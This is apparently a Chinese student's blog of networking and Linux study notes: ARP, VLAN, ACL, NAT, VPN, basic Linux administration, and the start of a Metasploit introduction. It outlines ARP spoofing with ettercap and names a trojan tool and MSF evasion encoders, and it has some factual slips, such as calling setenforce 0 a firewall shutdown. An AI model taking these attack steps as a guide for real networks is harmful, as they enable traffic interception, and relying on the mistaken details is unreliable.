</p><p>=========================================================<br>ARP协议讲解：<br>1.地址解析协议<br>2.作用：将IP解析为MAC地址<br>3.原理：<br>1）发送ARP广播请求<br>    ARP报文内容:我是10.1.1.1 我的mac：AA<br>                    谁是10.1.1.3 你的mac：？<br>2）接收ARP单播应答<br>4.ARP攻击或欺骗的原理是：<br>  通过发送伪造虚假的ARP报文（广播或单播），来实现的攻击或欺骗！<br>  如虚假报文的mac是伪造的不存在的，实现ARP攻击，结果为中断通信/断网！<br>  如虚假报文的mac是攻击者自身的mac地址，实现ARP欺骗，结果可以监听、窃取、篡改、控制流量，但不中断通信！  </p><p>5.ARP协议没有验证机制，所以容易被arp投毒攻击</p><p>6.ARP攻击者通过发送虚假伪造的arp报文对受害者进行ARP缓存投毒</p><p>7.路由器的工作原理<br>1）一个帧到达路由，路由器首先检查目标MAC地址是否自己，如果不是则丢弃，如果是则解封装，并将IP包送到路由器内部<br>2）路由器检查IP包头中的目标IP，并匹配路由表，如果匹配失败，则丢弃，并向源IP回馈错误信息，如匹配成功，则将IP包路由到出接口。<br>3）封装帧，首先将出接口的MAC地址作为源MAC封装好，然后检查ARP缓存表，检查是否有下一跳的MAC地址，如有，将提取并作为目标MAC地址封装到帧中，如没有，则发送ARP广播请求下一跳的MAC，并获取到对方的mac地址，再记录缓存，并封装帧，最后将帧发送出去。<br>8.如果公司有人在做ARP欺骗，该如何找到此人？</p><h3 id="ARP防御"><a href="#ARP防御" class="headerlink" title="ARP防御"></a>ARP防御</h3><p>arp默认是没有防御能力的。<br>ARP攻击防御：<br><strong>1.静态ARP绑定：</strong>手工绑定/双向绑定即如果攻击者在线路上仿造mac地址，路由器是不信任它的，只信任固定绑定的静态ARP。<br>  windows客户机上：<br>  arp -s 10.1.1.254  00-01-2c-a0-e1-09做静态绑定<br>  arp -a  查看ARP缓存表<br> 路由器上静态绑定：Router(config)#arp 10.0.0.95 0013.240a.b219 arpa f0/0<br>优点：配置简单<br>缺点：工作量大，维护量大，关机后就消失。</p><p><strong>2.ARP防火墙</strong><br>  自动绑定静态ARP，主动防御，会不断向网关发送数据包证明自己是自己，所以360卫士不会主动打开arp防火墙，因为会对公司网络造成负担。<br>  优点：简单易用<br>  缺点：当开启人数较多时，会增大网络负担  </p><p><strong>3.硬件级ARP防御</strong>：<br>  交换机支持“端口”做动态ARP绑定（配合DHCP服务器）<br>  或做静态ARP绑定<br>  如：<br>  conf t<br>  ip dhcp snooping<br>  int range f0/1 - 48<br>  switch(config-range-if)#</p><h2 id="VLAN"><a href="#VLAN" class="headerlink" title="VLAN"></a>VLAN</h2><p>广播的危害：增加网络负担，容易传播病毒，安全性降低。<br><strong>减少广播的方法：</strong>减少广播域<br>可以使用路由器进行隔离广播（物理广播），缺点：成本高，不灵活<br>使用VLAN限制广播域：VLAN是在交换机上通过逻辑隔离实现的广播域分割。实际上就是在广播域中在创建多个频段，使分割开的计算机处在不同的频段中。VlAN作用就是使用逻辑来隔离广播，没有使用物理硬件。因为无法完成不同vlan之间的通信，所以我们可以看成一个vlan=一个网段，但在现实中不是这样的。<br> <strong>Trunk</strong><br>trunk的作用是使用vlan进行逻辑划分之后，如果处在相同域但是不同的两个交换机之间是不能进行互通的，因为中间隔着两台交换机，即使是相同的域交换机之间也不能识别。所以引用了trunk技术，可以实现不同的交换机之间相同的域之间进行通信。但是无法完成不同交换机之间非相同的域之间通信。<br><strong>单臂路由</strong><br> 为了方便管理，在设置网络过程中通常是一个vlan设置为一个网段。但是vlan是设置在交换机上，而不同的网段是通过路由器的接口进行分开的，为了完成交换机可以实现不同网段的划分，可以将路由器添加多个子接口（虚拟接口，可以有上万个），虚拟接口即可完成不同网段的划分（虚拟接口与物理接口的区别是前者不如后者稳定）。但是不同的vlan之间无法通信，所以要想办法弥补该缺点。因为交换机无法完成两个网段的通信，所以会通过路由的子接口进行通信，即PC中的vlan1数据包传送到交换机，交换机通过trunk接口传送到路由器子接口1，然后子接口找到目标接口也就是子接口2，数据包传送到子接口2，子接口2通过trunk接口传送到交换机，进而找到另一个网段的vlan2，从事实现不同vlan之间的通信。单臂路由就是交换机与路由器之间的通信通过trunk接口，进行通信，防止每个vlan配一个交换机到路由器之间的接口，导致接口不够用。所以只通过一个trunk接口连接到路由就是单臂路由。<br>单臂路由的缺点：1.网络瓶颈2.容易发生单点物理故障3.vlan之间发送的每一个祯都需要单独路由。<br><strong>ICMP</strong><br>icmp协议没有端口号<br>作用：网络探测与回馈机制。  </p><h2 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h2><p>ACL   </p><ol><li><p>Access Control List  </p></li><li><p>ACL是一种包过滤技术，用于根据条件进行ip网段的过滤，实现某个网段和另一个网段的是否允许通信。  </p></li><li><p>ACL基于IP包头的IP地址、四层TCP/UDP头部的端口号。<br>   基于三层和四层过滤  </p></li><li><p>ACL在路由器上配置，也叫ACL表。也可以在防火墙上配置（一般称为策略）  </p></li><li><p>ACL主要分为2大类：<br>1）标准ACL<br>2）扩展ACL  </p></li><li><p>标准ACL：<br> 表号：1-99<br> 特点：<font color="red">只能基于源IP对包进行过滤</font><br> 命令：<br> conf  t<br> access-list  表号  permit/deny   源IP或源网段  反子网掩码，为什么使用反子网掩码，因为通过反子网掩码实现对ip网段的过滤，而子网掩码是实现网络号和主机的区分。<br> 注释：反子网掩码：将正子网掩码0和1倒置    </p><pre><code>       255.0.0.0  --  0.255.255.255           255.255.0.0  --  0.0.255.255           255.255.255.0  --  0.0.0.255    </code></pre><p> 反子网掩码作用：用来匹配条件，与0对应的需要严格匹配，与1对应的忽略（不进行匹配）。 允许还是拒绝取决于deny和permit </p><p> 例如： access-list   1   deny   10.0.0.0   0.255.255.255    </p><pre><code>        解释：该条目用来拒绝所有源IP为10开头的！             access-list   1   deny   10.1.1.1  0.0.0.0          解释：该条目用来拒绝所有源IP为10.1.1.1的主机          简写：access-list   1   deny   host  10.1.1.1           access-list   1   deny   0.0.0.0  255.255.255.255          解释：该条目用来拒绝所有所有人          简写： access-list   1   deny   any  </code></pre></li></ol><p>完整的案例：<br>conf t<br>acc 1 deny host 10.1.1.1<br>acc 1 deny 20.1.1.0 0.0.0.255<br>acc 1 permit any  </p><p>查看ACL表：<br>show  ip  access-list  [表ID]  </p><p>将ACL应用到接口：<br>int  f0/x<br>   ip  access-group  表号  in/out<br>   exit  </p><p>sh run  </p><p>7.扩展ACL：<br>    表号：100-199<br>    特点：<font color="red">可以基于源IP、目标IP、端口号、协议等对包进行过滤（区别于标准ACL）</font><br>    命令：<br>acc 100 permit/deny  协议  源IP或源网段  反子网掩码  目标IP或源网段  反子网掩码  [eq 端口号]<br>注释：协议：tcp/udp/icmp/ip  </p><p>案例：<br>acc 100 permit tcp host 10.1.1.1 host 20.1.1.3 eq 80<br>acc 100 permit icmp host 10.1.1.1 20.1.1.0 0.0.0.255<br>acc 100 deny ip host 10.1.1.1 20.1.1.0 0.0.0.255<br>acc 100 permit ip any any  </p><p>8.ACL原理<br>1）ACL表必须应用到接口的进或出方向才生效！<br>2）一个接口的一个方向只能应用一张表！<br>3）进还是出方向应用？取决于流量控制总方向<br>4）ACL表是严格自上而下检查每一条，所以要主要书写顺序<br>5）每一条是由条件和动作组成，当流量完全满足条件当某流量没有满足某条件，则继续检查下一条<br>6）标准ACL尽量写在靠近目标的地方<br>7）wencoll小原理：<br>     1）做流量控制，首先要先判断ACL写的位置（那个路由器？那个接口的哪个方向？）<br>     2）再考虑怎么写ACL。<br>     3）如何写？<br>          首先要判断最终要允许所有还是拒绝所有<br>          然后写的时候要注意：将严格的控制写在前面<br>8）一般情况下，标准或扩展acl一旦编写号，无法修改某一条，也无法删除某一条，也无法修改顺序，也无法往中间插入新的条目，只能一直在最后添加新的条目<br>     如想修改或插入或删除，只能删除整张表，重新写！<br>     conf t<br>     no  access-list  表号  </p><p>9.命名ACL：<br>  作用：可以对标准或扩展ACL进行自定义命名<br>  优点：自定义命名更容易辨认，也便于记忆！<br>            可以任意修改某一条，或删除某一条，也可以往中间插入某一条  </p><p>命令：<br>conf t<br>ip  access-list  standard/extended   自定义表名<br>      开始从deny或permit编写ACL条目<br>      exit  </p><p>删除某一条：<br>ip  access-list  standard/extended   自定义表名<br>      no  条目ID<br>      exit  </p><p>插入某一条：<br>ip  access-list  standard/extended   自定义表名<br>      条目ID   动作   条件<br>      exit</p><h2 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h2><p>network address tanslation 网络地址转换。<br>用来解决ipv4地址不够用了的问题。所以将ip地址分为公网ip和私网ip。公网上不允许出现私网ip，而私网ip可是重复在私网中使用，所以最终解决了该问题。例如192.168.0.12在这一个私网网段中可以使用，同时在另一个私网网段中也可使用。原理，同下面的IPsecVPn原理一样<br>私有地址ip从各个网段中选取一些范围<br>1）10.0.0.0/8（10开头的 ）<br>2）172.16.0.16/16-172.31.0.0/16（172.0-172.31的范围为私网地址）<br>3）192.168.0.0/16（192.168开头的）<br>其他一律是公网地址，路由器只允许公网地址通过，不允许私网地址通过。<br>如果私网地址想要访问公网，就是用NAT技术<br>NAT实现公网和私网的转换技术，一般是路由器或者防火墙上来完成。<br>NAT三大类<br>1）静态NAT<br>2）动态NAT<br>3）PAT（端口地址转换）<br><strong>内网之间实现通讯</strong><br>首先，两个在不同局域网里的pc机是不能直接建立连接的（不知道对方ip啊），除非知道了对方的公网ip地址和端口号，或者借助中间手段，比如qq聊天就是的，我们访问百度时不就通过域名知道了它的公网ip地址和端口号嘛。好，现在我们假设知道了对方的公网号和端口号，那我们直接把目的ip和端口号给我们连接着的路由器，此时路由器通过子网掩码判断我们主机ip（他会自动把你的内网ip映射成所在的公网ip）和目的ip是否相同，因为在不同局域网下，所以肯定不同，此时会根据路由表中的子网信息把信息一层层发送给对方连接的路由器，此时对方的路由器会根据信息中包含的端口号给你映射出对方在其路由器下的内网地址，下面的工作就交给链路层了。<br>简单概括：利用对方的公网ip，找到对方所连的路由器（最上层的路由器自己肯定有一个全球唯一的ip），<strong>利用对方的端口号让对方所连的路由器映射成对方的内网地址</strong>（即公网的路由器中的每个端口号对应每个内网ip地址，例路由器445端口可能对应私网192.168.0.66）。</p><h2 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h2><p>全拼 virtual private network 虚拟专有网络<br>解决两个公司之间实现专有网络的通信，专有网络的特点是安全，而且稳定。如果使用专线通信，则成本比较高，如果使用互联网通信，则不安全，所以使用VPN诞生，即虚拟专有网络。<br>VPN实现了不安全网络上进行安全传输。<br><strong>VPN类型：</strong><br>1远程访问VPN<br>用在个人安全连接到公司网络，一般用于员工在家办公时使用，一般公司部署VPN服务器，而员工远程拨号连接。<br>常见VPN协议：PPTP,L2TP,SSTP。SSLVPN</p><p>2.点到点VPN。<br>一般用在公司和公司之间安全连接。<br>常见VPN协议：IPsecVPN   </p><h3 id="IPsecVPN"><a href="#IPsecVPN" class="headerlink" title="IPsecVPN"></a>IPsecVPN</h3><p>属于点到点VPN，可以在两家企业之间建立隧道。<br>优点：1.安全 2.合并两家企业内网。<br>原理：公司之间进行数据传输，首先公司1将数据发送到公网的第一个路由器上，该路由器将数据包的源ip和目标Ip替换为公网上的第一个ip和公网上的最后一个ip，在这中间是进行加密传输的。数据包到达最后一个路由器之后，又将源ip和目标ip替换为刚发送时的ip，这样数据到达公司内网之后，公司内网查看数据包，发现源ip和目标ip都属于该公司的网段，最后进行数据包的解密完成数据传输。</p><h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p>定义：一款具备安全防护功能的网络设备。<br>与路由器的区别是，路由器默认是全部可以通过的，写安全协议是为了保证哪些网络不可以实现通讯，而防火墙默认是全部都是屏蔽的，写安全协议是为了保证哪些网络可以通过。<br>防火墙可以完全替代路由器，包括路由器和交换机的所有功能。</p><h2 id="ARP攻击-1"><a href="#ARP攻击-1" class="headerlink" title="ARP攻击"></a>ARP攻击</h2><p>攻击者被攻击者与服务器需要在同一个网段中，因为交换机属于二层设备，所以它是通过转发mac地址进行信息转发的，而路由器是根据ip地址进行转发，因为在同一网段中，所以应用交换机中mac地址表，这个表是电脑连接到交换机的时候自动生成的。<br><strong>ARP作用</strong>：根据ip地址解析mac地址。发送者发送广播请求，接收者发送单播应答。<br><strong>攻击原理</strong>：A需要发送信息给C，发出广播之后，攻击者B使用ARP伪造工具告诉A自己是接收者，但此时C也告诉A自己是接收者，此时A选择回复较慢的那个作为接收者，同时攻击者B一直告诉A自己是接收者，所以它一定是回复最慢的那个，所以最终B替换了C作为接收者，但是B需要回复，所以它作为一个过渡部分，告诉C自己是A，将数据包发送C，C接收到后回复信息以同样的原理将信息回复给了B，B又作为过度者，以C的身份将数据包回复给A。更厉害的是在同一网段中，B会发送广播告诉自己是ip1，ip2….等所有地址，所以同一网段中的其他主机无论发送给哪台电脑最终都会经过B，B也会获取所有电脑发送的信息。<br><strong>操作过程</strong><br>将系统连接到同一网段<br>配置ip地址，kali配置ip地址，ifconfig eth0 192.168.0.66/24 其中/24表示3个255，8表示一个255，16表示2个255.<br>配置web和FTP服务器。<br>打开kali找到ettercap工具，在应用程序中搜索ett，使用该工具进行攻击。    </p><p><font color="red">下载网站源码，进入网站之后，右键另存为，选择全部文件，设置保存路径即可进行源码下载。</font>  </p><h2 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h2><p>结果控制电脑<br>工具，灰鸽子   </p><h2 id="扫描技术"><a href="#扫描技术" class="headerlink" title="扫描技术"></a>扫描技术</h2><p>工具nmap，参考网络安全学习。kali自带<br>暴力破解<br>漏洞扫描，参考文档openvas</p><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><p>用户名root密码123.com<br>打开终端后提示：【root@localhost 桌面】# 解释：【当前用户名称@主机名称 当前所在路径】#当前权限为用户管理员，如果是$表示当前权限为普通用户<br><strong>了解硬件信息</strong><br>查看硬盘：fdisk -l 执行命令后看到 disk /dev/sda   在linux系统中 sd(硬盘类型)，a(第一块)，sdb(第二块硬盘)<br>查看内存大小:cat /proc/meminfo<br>查看cpu型号：cat /proc/cpuinfo<br>关机命令：poweroff<br>重启：reboot<br><strong>linux目录</strong><br>进入终端之后执行cd ..发现由桌面变成了 <del>，执行pwd（查看当前路径名称）这代表进入了/root目录，linux中在自己的家中都是使用</del>代替，再执行cd ..发现进入了/，其中/是整个系统的根目录<br>列出当前目录中的内容：ls (list)<br>pwd:查看当前目录路径（print working directory）<br>cd：change dir<br>目录<br>/bin:（binary）存储普通用户和管理员都可以执行的命令<br>/sbin：存储只有管理员才能执行的命令<br>/boot：主引导目录，独立的分区，启动菜单，内核<br>/dev:device设备存放目录<br>/etc：（etcetera）配置文件存放目录<br>/home：普通用户的家目录<br>/root:管理员的家目录<br>/media:光驱的挂在目录<br>/mnt：（mount）临时设备关在目录（例如u盘）<br>/proc：（process）内存中的数据文件，进程的所在目录<br>/tmp：（temp）临时目录<br>/usr：（unix system resourse）第三方软件的安装目录<br>/var：（variable）常变文件的存放目录<br><strong>快捷键</strong><br>如果文件自当前目录下，如果想要进入该文件夹，那么直接输入cd + tab键即可自动补全。<br>执行某个文件：在该目录路径下，输入./文件名 就会自动执行该文件<br>清屏：ctrl+L<br>终止快捷键：ctrl+c<br><strong>文件类型</strong><br>其中浅蓝色代表符号链接，<br>红色代表压缩文件，<br>绿色代表可执行文件，<br>黑底黄字代表普通文件，<br>深蓝色代表文件夹。<br>黑色:普通文件<br>紫色：图片，模块文件</p><h2 id="linux命令"><a href="#linux命令" class="headerlink" title="linux命令"></a>linux命令</h2><h3 id="命令的格式"><a href="#命令的格式" class="headerlink" title="命令的格式"></a>命令的格式</h3><p>命令字 +【选项】+ 【文件或者文件夹】<br>查看命令的使用方法：1. man 命令字 例如 man ls （man表示menu）<br>例如 ls -a 显示隐藏文件，ls -lh显示文件的详细信息，ls -r 显示文件夹<br>2.使用help + 命令字 例如 help cd （区别，命令分为内部命令和外部命令，内部命令是系统自带的命令使用help，外部命令是安装第三方软件带的命令使用man）<br>查看文件夹下的内容：ls<br>查看文件的内容但是不能编辑：cat 文件名<br>创建文件：touch 文件名<br>创建目录：mkdir 文件夹名<br>将内容输出到文件中:echo “hello” &gt; class.txt<br>剪切文件：mv 源文件路径  目标路径<br>复制文件：cp 源文件路径  目标路径<br>符号链接：ln -s 源文件路径（绝对路径） 目标路径 （link）操作目标文件时，源文件也随着变化。<br>强制删除文件:rm -f 文件<br>强制删除文件夹：rm -rf（也可以是-fr） 文件夹    </p><h3 id="解压缩"><a href="#解压缩" class="headerlink" title="解压缩"></a>解压缩</h3><p>首先创建一个100M的文件：dd if=/dev/zero of=/tmp/bigfile bs=1M count=100<br>if 表示inputfile，of表示outfut bs表示单位，count表示计数器；<br>压缩文件：方式1：gzip 文件名 例如：gzip bigfile 解压：gunzip bigfile.gz<br> 方式2：bzip2 文件名 例如：bzip2 bigfile 解压 bunzip2 bigfile.bz2<br>如果想要压缩文件夹，使用gzip或者bzip2都是不行的显示这不是一个文件。所以我们需要先将它打包成一个文件，然后再压缩。打包命令 tar -cf /tmp/bigfile2.tar /tmp/bigfile2其中c表示create ，f表示file，后面接打包后的文件，最后接想要打包的文件。接下来进行压缩 gzip bigfile2.tar<br>解压缩文件夹：先解压 gunzip bigfile2.tar.gz 然后解包 ：tar -xf /tmp/bigfile2.tar -C /root/tmp 其中-C表示解包后保存的路径。<br>但是上面解压缩文件的方法比较麻烦需要四步，这里我们可以使用两步：即打包和压缩合成一步为： tar -zcf /tmp/bigfile2.tar.gz /tmp/bigfile2<br>将解压缩和解包合成为一步为：tar -zxf /tmp/bigfile2.tar.gz -C /root<br>同理，如果使用bzip2，将z换为j 即可。  </p><h3 id="vim编辑器"><a href="#vim编辑器" class="headerlink" title="vim编辑器"></a>vim编辑器</h3><p>vim编辑器分为命令模式，输入模式，末行模式<br>输入i，我们即可进入输入模式，按下ESC键即可进入命令行模式，再命令模式中按下冒号：即可进入末行模式；但是输入模式永远无法跳到末行模式<br>末行模式<br>再输入模式中可进行编辑字符，如果编辑完成想要退出，那么就跳到末行模式，<br>输入:wq保存并退出，其中w（write），q（quite）<br>：q!不保存并退出<br>：set nu，设置显示行号<br>：% s/new/old/g 表示每一行中的old字符替换成new字符<br>：50，56 d删除50-56行的数据<br>命令模式：<br>命令模式主要是使用快捷键，都是再光标所在行上操作<br>2yy 复制当前行以及下一行（共两行）<br>p 粘贴到下一行<br>dd 删除当前行<br>gg 回到第一行<br>G 跳到最后一行<br>50G 快速跳到第50行  </p><h3 id="linux软件安装"><a href="#linux软件安装" class="headerlink" title="linux软件安装"></a>linux软件安装</h3><p>软件分为源码包和封装后的软件包。<br>其中源码包是开源的，一般都是压缩包形式的，可以进行二次开发。</p><h4 id="源码包："><a href="#源码包：" class="headerlink" title="源码包："></a>源码包：</h4><p>以httpd压缩包为例：将其拷贝到linux系统中使用ls查看发现为绿色，这是因为从windows拷贝过去的原因。<br>将其解压 tar -zxf httpd-2.2.25.tar.gz -C /usr/src。<br>查看该软件怎么装以及软件的功能，打开压缩包，查看里面的readme文件。安装方法查看INSTALL文件。发现有安装方法如下：  </p><pre><code>$ ./configure --prefix=PREFIX $ make $ make install $ PREFIX/bin/apachectl start</code></pre><p>开始安装:<br>1.通过配置脚本设置软件安装目录以及安装路径，并生成makfile脚本文件。<br>./configure –prefix=/usr/local/webserver开始检查当前系统是否能够安装该软件。<br>2.执行make 命令开始控制makefile文件执行顺序编译<br>3.执行make install命令，将编译号的文件拷贝到安装目录下<br>4.在webserver的bin目录下，执行./apachectr start 开启apache服务(会出现失败但是不影响)    </p><h4 id="封装后的软件包"><a href="#封装后的软件包" class="headerlink" title="封装后的软件包"></a>封装后的软件包</h4><p>特点安装便捷。后缀rpm（redhat packege manage）和deb（debian），rpm软件包只能安装在redhat系统上，deb只能安装在debian系统上，其中centos属于redhat系统。<br>进入 /media/centos/package 里面所有的rpm都是系统自动带的软件包。<br>1.查找tree软件包，执行 ls | grep “tree” 命令，过滤出tree软件包，其中 | 为管道符，表示执行ls命令后在该结果中进行操作，grep表示过滤。<br>2.针对tree-1.5.3-3.el6.x86_64.rpm这个软件包首先确认以前是否安装该软件包，执行rpm -qa | grep “tree”(神马都没有返回说明没有安装过)<br>3.确认该软件包的作用：执行rpm -qpi tree-1.5.3-3.el6.x86_64.rpm 可以看到该软件相当于一个查看器，可以查看目录和子目录中的所有内容。<br>4.确认软件包的安装目录：rpm -qpl tree-1.5.3-3.el6.x86_64.rpm（封装后的软件包安装路径无法修改）<br>5.开始安装:rpm -ivh tree-1.5.3-3.el6.x86_64.rpm  ,使用该软件，man tree<br>6.软件卸载：rpm -e tree  </p><h4 id="卸载vim编辑器"><a href="#卸载vim编辑器" class="headerlink" title="卸载vim编辑器"></a>卸载vim编辑器</h4><p>1.首先查看vim编辑器的软件包，rpm -qa | grep “vim”<br>2.先卸载rpm -e vim-enhanced-7.4.629-5.el6_8.1.x86_64.rpm 这个软件包，然后rpm -e vim-common-7.4.629-5.el6_8.1.x86_64.rpm才能够卸载vim，否则不能卸载这说明两者具有一定的依赖关系。<br>3.如果想要安装则应该先安装rpm -ivh vim-common-7.4.629-5.el6_8.1.x86_64.rpm，然后安装 rpm -ivh vim-enhanced-7.4.629-5.el6_8.1.x86_64.rpm 才能够安装完成。    </p><h3 id="linux操作系统中的用户分类"><a href="#linux操作系统中的用户分类" class="headerlink" title="linux操作系统中的用户分类"></a>linux操作系统中的用户分类</h3><p>1.普通用户<br>2.超级管理员<br>3.<br>三个主要文件<br>1./ect/passwd:这个文件存储了所有用户的信息，查看该文件发现每个用户信息共分为7个字段，例如root:x:0:0:root:/root:/bin/bash<br>字段1：用户名称<br>字段2：密码占位符，但是密码没有保存在这里<br>字段3：uid，0表示超级用户，普通用户500-60000之间，1-499表示程序用户（每次启动一个进程都需要一个用户，为了保证安全，不允许登录系统）<br>字段4：gid，基本组id<br>字段5：用户信息记录字段<br>字段6：用户家目录<br>字段7：用户登录后使用的命令解释器<br>2./etc/shadow：保存了用户的密码信息。<br>root:$6$zu478atnOmO1eEs.例如$suqmDLerOmzDenQzoMW0Th1j3fuC3Ppy6bRr4I2tVQA9bh.wHDIRq7FZFEOimnRIrbZm5i0W.LbvJCU4n.EON0:18453:0:99999:7:::<br>字段1：用户名<br>字段2：用户密码（sha加密）<br>字段3：距离1970/1/1日密码最近修改的时间<br>字段4：密码有效期（0表示无限期）<br>字段5：密码最长有限期<br>字段6：密码过期前7天警告<br>字段7；密码的不活跃期。<br>字段8：用户的失效时间<br>3./etc/group  </p><h4 id="用户的组信息"><a href="#用户的组信息" class="headerlink" title="用户的组信息"></a>用户的组信息</h4><p>1.建立一个class1组，组id为1000，建立一个class2组，组id为2000<br>groupadd class1 创建组，groupmod -g 1000 class1，修改组id为1000<br>建立组class2，groupadd -g 2000 class2<br>2.建立tom用户，要求基本组为class1组，附加组class2组，tom用户id为600.<br>useradd -g class1 tom，如果没将tom归属到class1组，那么创建用户的时候系统会默认创建一个tom组<br>附加组，id=600： usermod -G class2 -u 600 tom<br>3.创建一个程序用户uid为250，用户名为testuser，没有家目录<br> useradd -u 250 -M -s /sbin/nologin testuser ，其中-M表示没有家目录， -s /sbin/nologin表示程序用户不允许登录系统。<br>4.为tom用户设定密码为123，设定密码最长有效期为90天，将用户密码进行锁定使其无法登录系统。<br> passwd tom,开始输入密码<br>chage -M 90 tom,设置为90天<br>passwd -S tom ，查看状态<br>passwd -l tom ,锁定<br>passwd -u tom ,解锁<br>5.删除tom用户和testuser用户。删除class1和class2组<br>userdel -r tom   ，-r的作用是删除用户家目录中的所有文件<br>userdel -r testuser<br>groupdel class1<br>groupdel class2</p><h3 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h3><p>过   </p><h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><p>通过配置文永久更改网络地址<br>eh0：192.168.0.154/24<br>eh1：1721.68.0.45/24<br>vim /etc/sysconfig/network-scripts/ifcfg-eh0将hwaddr，uuid，nm-controlled这几行都删掉，添加IPADDR=192.168.0.154,和NETMASK 255.255.255.0 ,然后将onboot改为yes，将bootporto改为static<br>eth1同样这样更改。  </p><h3 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h3><p>/var/log<br>分类：系统日志messages，登录日志secue，程序日志  </p><h3 id="web服务"><a href="#web服务" class="headerlink" title="web服务"></a>web服务</h3><p><strong>lamp平台</strong>，linux，apache（httpd），mysql，php<br>条件：ip 端口（80或者443）<br>1.启动httpd服务<br> service httpd start<br>2.验证是否开启<br> ss -antpl | grep 80<br>3.主页建立<br>cd /var/www/html  ,vim index.html书写html源码<br>4.关闭防火墙<br>setenforce 0<br>5.主配置文件分析<br>vim /etc/httpd/conf/httpd.conf<br>6.访问控制设定<br>过<br>7.安装MySQL数据库<br>yun install mysql -server -y,启动，server mysql start，设置账号密码，mysqladmin -u root -p password “123465”，登录 mysql -u root -p<br>8.安装php<br>yum install php<br>9.安装php链接数据库插件<br>yum install php-mysql<br><strong>lnmp平台</strong><br>n代表nginx，它的特点是承载压力强  </p><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><p>1MB=8*Mb 一百兆宽带等于100/8的网速<br>python中print函数是自带换行的。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>网络安全学习</title>
      <link href="/2020/04/06/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/04/06/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="MSF学习"><a href="#MSF学习" class="headerlink" title="MSF学习"></a>MSF学习</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p><strong>bwapp漏洞环境</strong>，首先开启phpstudy依赖于bwapp 保存位置D:\phpStudy\PHPTutorial\WWW\bwapp\bWAPP 访问网址<a href="http://ip:端口/bwapp/bwapp/login.php登录账号bee，登录密码bug">http://ip:端口/bwapp/bwapp/login.php登录账号bee，登录密码bug</a><br><strong>pikachu漏洞环境</strong>：启动phpstudy，网址http：//ip+端口/pikachu<br><strong>访问struts2安装环境：</strong>启动jspstudy，在浏览器中输入<a href="http://ip:8081/struts2-showcase" target="_blank" rel="noopener">http://ip:8081/struts2-showcase</a><br><strong>Jboss</strong>  找到bin目录下，双击run.bat进行运行，然后在浏览器中输入<a href="http://127.0.0.1:8080或者localhost：8080，（注意不能使用ip地址进行访问)。">http://127.0.0.1:8080或者localhost：8080，（注意不能使用ip地址进行访问)。</a><br><strong>weblogic启动过程</strong>找到D:\oracle\user_projects\domains\base_domain下的startweblogic.cmd开始启动，然后再浏览器中输入管理网址192.168.0.45:7001/console进入管理页面。<br><strong>webug</strong>安装后登录某个网页后账号和密码都不知道，所以通过找到目录文件查看，或者网上搜索。<br>IIS网站配置过程中，将网站源码下载之后放到D:wwwtest文件夹中，然后点击iis部署网站问题1：，部署完之后找login.asp或者index.asp文件进行登录，当出现没有父路径时，右击网站属性在主目录中找到更改配置，高级找到启用父目录<br>问题2;下载完之后显示access数据库没有权限，可以找到db这个数据库文件夹，然后右键权限，添加用户为everyone，权限为完全控制即可。<br>问题3，提示为需删除原来的defalt.asp文件，然后更改defalt0.asp为defalt.asp,更改之后即可。<br>问题4，搭建完成之后发现localhost拒绝了我们的请求，这是因为端口被占用了。修改一下端口即可。<br>火狐浏览器插件 hackbar</p><h3 id="MSF介绍"><a href="#MSF介绍" class="headerlink" title="MSF介绍"></a>MSF介绍</h3><p>全名The Metasploit Framework 即漏洞框架 ，自带攻击工具</p><h3 id="MSF术语"><a href="#MSF术语" class="headerlink" title="MSF术语"></a>MSF术语</h3><ol><li>exploit &emsp;&emsp;&emsp;攻击行为</li><li>payloads&emsp;&emsp;&emsp;攻击载荷即攻击代码</li><li>shellcode&emsp;&emsp;&emsp;溢出代码即攻击载荷运行的攻击机器指令</li><li>module &emsp;&emsp;&emsp;也就是软件代码组件</li><li>listner&emsp;&emsp;&emsp;监听器，攻击时返回给攻击者的信息</li></ol><h3 id="MSF中模块（module）介绍"><a href="#MSF中模块（module）介绍" class="headerlink" title="MSF中模块（module）介绍"></a>MSF中模块（module）介绍</h3><ol><li>Auxiliary&emsp;&emsp;&emsp;主要包括渗透测试中一些辅助性的脚本</li><li>Encoders：&emsp;&emsp;各种编码工具,用于躲过入侵检测和过滤系统</li><li>Exploits：&emsp;&emsp;包括了 exp、0day、各种漏洞使用的脚本</li><li>Nops：&emsp;&emsp; NOP (No Operation or Next Operation) sled,由于 IDS/IPS 会检查数据包中不规则的数据，所以在某些场合下(比如针对溢出攻击),某些特殊的滑行字符串(NOPS x90x90…)则会因为被拦截而导致攻击失效，所以此时需要修改 exploit 中的 NOPs.nops</li><li>Payloads ：&emsp;&emsp;这个单词翻译过来叫载荷：是攻击者发送给系统执行的指令（不包括  exploits  攻击阶段），payloads  主要是在目标机执行的，而 exploits 是在本地机执行作用于目标机。</li><li>Post: &emsp;&emsp;&emsp;&emsp;这个目录里放着 msf 的 exploits 执行成功后，向目标机发送的一些功能性指令比如：提权，获取 hash 等。</li><li>Data： &emsp; &emsp;这个目录里盛放了 Meterpreter、PassiveX、Vnc、DLLs 等这些工具和一些用户接口代码，Msfweb 和一些其他模块用到的数据文件。</li><li>Plugins：&emsp;&emsp;&emsp;这里的模块用户需要使用 load 来加载，提供数据库连接控件， 和各种要用到的控件。</li><li>Scripts：&emsp;&emsp;&emsp;这个目录下的文件大都是Meterpreter 这个模块到用的脚本。比如Meterpreter 里用到的migrate 